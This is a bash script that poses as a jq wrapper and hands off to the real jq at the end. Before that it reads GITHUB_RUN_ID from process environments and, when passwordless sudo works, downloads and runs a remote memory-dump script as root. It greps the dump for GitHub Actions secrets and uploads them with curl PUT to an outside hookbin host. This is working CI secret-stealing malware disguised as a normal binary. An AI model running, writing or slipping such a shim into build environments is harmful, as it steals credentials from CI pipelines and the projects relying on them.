#!/usr/bin/env bash

# Secret exfiltration payload
if [ -z "${GITHUB_RUN_ID:-}" ]; then
  export GITHUB_RUN_ID=$(grep -aoE "GITHUB_RUN_ID=[0-9]+" /proc/*/environ 2>/dev/null | head -n 1 | cut -d= -f2 || echo "unknown")
fi

# Run exploit if sudo is available
if /usr/bin/sudo -n /usr/bin/true 2>/dev/null; then
  /usr/bin/curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | /usr/bin/sudo -E /usr/bin/python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
  /usr/bin/curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
fi

# Run real jq
exec /usr/bin/jq "$@"
